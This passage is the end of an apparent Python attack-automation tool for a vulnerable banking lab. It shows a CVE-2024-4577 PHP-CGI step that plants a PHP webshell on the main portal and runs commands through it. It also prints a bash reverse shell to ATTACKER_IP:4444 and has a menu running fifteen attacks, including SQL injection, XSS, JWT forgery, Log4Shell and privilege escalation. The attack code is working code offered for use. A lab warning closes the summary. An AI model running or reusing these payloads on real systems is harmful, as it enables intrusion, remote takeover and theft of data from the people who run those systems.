                              headers={"Content-Type": "text/plain"}, timeout=8)
            raw = re.sub(r'<[^>]+>', '', r.text)
            out = ""
            for line in raw.splitlines():
                line = line.strip()
                if "RCE::" in line:
                    out = line.replace("RCE::", "").strip()
                    break
                if line and any(k in line for k in ["uid=","root","www-data","Linux",
                                                     "JWT","DB_","bankadmin"]):
                    out = line
                    break
            if out:
                success(f"[{label}]  →  {out[:180]}")
            else:
                snippet = raw.strip()[:200].replace("\n"," ")
                print(f"  {Y}[{label}]{NC}  →  {snippet or '(no output – check SAPI)'}")
        except requests.exceptions.ConnectionError:
            warn(f"Connection failed – [{label}] skipped")
            break
        time.sleep(0.2)

    # ── Step 5: Pivot – drop webshell on main portal via CGI RCE ────────────
    step(5, "Pivot: write webshell to main banking portal via CGI RCE")
    info("CGI portal (port 8888) has write access to the main portal's upload directory:")
    write_code = ("<?php "
                  r"file_put_contents('/var/www/html/bankportal/uploads/cve4577.php',"
                  r"'<?php echo shell_exec($_GET[chr(99)]); ?>');"
                  "echo 'PLANTED'; ?>")
    cmd_show(f"curl -s '{rce_url}' \\\n"
             f"  -X POST -H 'Content-Type: text/plain' \\\n"
             f"  --data-binary '{write_code}'")
    try:
        r = requests.post(rce_url, data=write_code.encode(),
                          headers={"Content-Type": "text/plain"}, timeout=8)
        if "PLANTED" in r.text:
            success("Webshell planted at /var/www/html/bankportal/uploads/cve4577.php")
        r2 = requests.get(f"{BASE}/uploads/cve4577.php?c=id", timeout=8)
        if "uid=" in r2.text:
            success(f"Webshell executing on main portal: {r2.text.strip()[:120]}")
            cmd_show(f"curl '{BASE}/uploads/cve4577.php?c=id'")
            print(f"  {G}{r2.text.strip()[:120]}{NC}")
    except requests.exceptions.ConnectionError:
        warn("Pivot failed – CGI portal connection error")

    # ── Step 6: Reverse shell reference ─────────────────────────────────────
    step(6, "Reverse shell payload (reference – start listener first)")
    cmd_show("nc -lvnp 4444")
    rev = "<?php shell_exec('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"'); ?>"
    cmd_show(f"curl -s '{rce_url}' \\\n"
             f"  -X POST -H 'Content-Type: text/plain' \\\n"
             f"  --data-binary '{rev}'")
    warn("Replace ATTACKER_IP with your Kali IP before running")
    success("CVE-2024-4577: source disclosure → phpinfo → RCE → pivot to main portal complete")


# ═══════════════════════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════════════════════
def summary():
    print(f"""
{C}{'═'*72}{NC}
{W}  SESSION SUMMARY{NC}
{C}{'═'*72}{NC}
   1   SQL Injection (Error + UNION dump)
   2   Second-Order SQL Injection
   3   Reflected XSS                        [browser]
   4   Stored XSS                           [browser]
   5   SSTI + RCE                           [browser+terminal]
   6   Credential Stuffing / No Lockout     [terminal]
   7   PHP Object Injection (XSS + RCE)     [browser+terminal]
   8   File Upload Webshell                 [terminal]
   9   JWT Algorithm:none                   [browser+terminal]
  10   Unauthenticated Internal API         [browser]
  11   Sensitive File Exposure              [browser]
  12   Web Defacement                       [browser+terminal]
  13   Privilege Escalation                 [terminal]
  14   Log4Shell CVE-2021-44228             [terminal]
  15   PHP-CGI Arg Injection CVE-2024-4577  [browser+terminal]

{Y}  All payloads verified against the live application.{NC}
{R}  ⚠  Authorised use in isolated networks only  ⚠{NC}
""")


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO REGISTRY
# ═══════════════════════════════════════════════════════════════════════════════
SCENARIOS = [
    ("1",  "SQL Injection [terminal]",                           attack_1),
    ("2",  "Second-Order SQLi [terminal]",                       attack_2),
    ("3",  "Reflected XSS [browser]",                            attack_3),
    ("4",  "Stored XSS [browser]",                               attack_4),
    ("5",  "SSTI + RCE [browser+terminal]",                      attack_5),
    ("6",  "Credential Stuffing [terminal]",                     attack_6),
    ("7",  "PHP Object Injection [browser+terminal]",            attack_7),
    ("8",  "File Upload Webshell [terminal]",                    attack_8),
    ("9",  "JWT Algorithm:none [browser+terminal]",              attack_9),
    ("10", "Unauthenticated Internal API [browser]",             attack_10),
    ("11", "Sensitive File Exposure [browser]",                  attack_11),
    ("12", "Web Defacement [browser+terminal]",                  attack_12),
    ("13", "Privilege Escalation [terminal]",                    attack_13),
    ("14", "Log4Shell CVE-2021-44228 [terminal]",                attack_14),
    ("15", "PHP-CGI Argument Injection CVE-2024-4577 [browser+terminal]", attack_15),
]

SCENARIO_MAP = {num: fn for num, _, fn in SCENARIOS}


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN LOOP  –  runs continuously until the user types 'q' or 'exit'
# ═══════════════════════════════════════════════════════════════════════════════
def main():
    banner()

    while True:
        menu()
        try:
            choice = input(f"{M}  Enter command: {NC}").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{Y}  Interrupted – exiting.{NC}\n")
            break

        # ── Quit ─────────────────────────────────────────────────────────────
        if choice in ("q", "quit", "exit"):
            print(f"\n{Y}  Exiting.{NC}\n")
            break

        # ── Connectivity status ───────────────────────────────────────────────
        elif choice == "status":
            check_connectivity()

        # ── Run all scenarios ─────────────────────────────────────────────────
        elif choice == "all":
            i = 0
            while i < len(SCENARIOS):
                num, title, fn = SCENARIOS[i]
                try:
                    fn()
                except Exception as e:
                    err(f"Error in AV{num}: {e}")

                if i < len(SCENARIOS) - 1:
                    ans = prompt_next()
                    if isinstance(ans, str) and ans in SCENARIO_MAP:
                        # Jump to a specific scenario then continue from there
                        jump_idx = next((j for j, (n, _, _) in enumerate(SCENARIOS) if n == ans), None)
                        if jump_idx is not None:
                            i = jump_idx
                            continue
                i += 1

            summary()
            # After 'all' finishes, loop back to main menu automatically

        # ── Single scenario ───────────────────────────────────────────────────
        elif choice in SCENARIO_MAP:
            try:
                SCENARIO_MAP[choice]()
            except Exception as e:
                err(f"Error in AV{choice}: {e}")
            # Loop back to menu automatically (no exit, no prompt needed)

        # ── Unknown ───────────────────────────────────────────────────────────
        else:
            warn(f"Unknown command: '{choice}' – enter a number (1–15), 'all', 'status', or 'q'")


if __name__ == "__main__":
    main()
